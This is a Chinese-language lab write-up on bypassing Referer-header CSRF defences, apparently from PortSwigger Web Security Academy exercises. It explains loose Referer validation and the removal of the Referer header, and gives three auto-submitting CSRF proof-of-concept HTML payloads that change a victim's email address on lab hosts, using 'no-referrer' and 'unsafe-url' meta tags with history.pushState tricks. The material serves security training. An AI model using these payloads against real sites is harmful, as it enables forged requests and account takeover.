### 基于 Referer 的 CSRF 防御

Referer 用于服务器获取请求页面的来源页面的 URL，如果服务器发现 Referer 头不合法，那么判定用户正在遭受钓鱼攻击。

常规的检测手法，检测 Referer 头是否是本域。

绕过手段：

- 宽松的 Referer 验证逻辑：攻击者控制 attacker.com/example.com，此时 Referer 为 attacker.com/example.com。

- 宽松的 Referer 验证逻辑：目标的 Referer 可以携带参数，攻击者控制 attacker.com?example.com，此时 Referer 为 attacker.com?example.com。

- Referer 标头的删除导致服务器不验证来源。

### 实验：Referer 标头的删除导致服务器不验证来源

payload：

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <!-- 包含以下 HTML 以禁止 referrer -->
  <meta name="referrer" content="no-referrer">
  <body>
    <form action="https://0aa0007c0387e677806e032d00d8004d.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="wiener&#64;pwned&#45;user&#46;net" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

### 实验：规避 Referer 验证

payload：

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0aa900b503dcb6a380f4120a00d6002e.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="wiener&#64;pwned&#45;user&#46;net" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

当你将 /0aa900b503dcb6a380f4120a00d6002e.web-security-academy.net 作为文件名，让受害者访问时，你会发现浏览器生成 referer 时自动把文件名删除了。

![image-20250419171844554](https://cdn.jsdelivr.net/gh/LilDean17/secdoc@main/Web%20%E5%AE%89%E5%85%A8/CSRF%20%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/images/image-20250419171844554.png)

那就在 HTML 加上

```
  <meta name="referrer" content="unsafe-url">		<!-- 防止添加的东西被过滤 -->
  
  <!-- history.pushState 用于在浏览器历史记录中添加一条新的记录，同时改变当前的 URL，但不会触发页面的刷新。-->
  history.pushState("", "", "/?0aa900b503dcb6a380f4120a00d6002e.web-security-academy.net")
  <!-- 更新历史 url，添加上这个参数 -->
```

完整 payload：

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <meta name="referrer" content="unsafe-url">
  <body>
    <form action="https://0aa900b503dcb6a380f4120a00d6002e.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="wiener&#64;pwned&#45;user&#46;net" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState("", "", "/?0aa900b503dcb6a380f4120a00d6002e.web-security-academy.net")
      document.forms[0].submit();
    </script>
  </body>
</html>
```

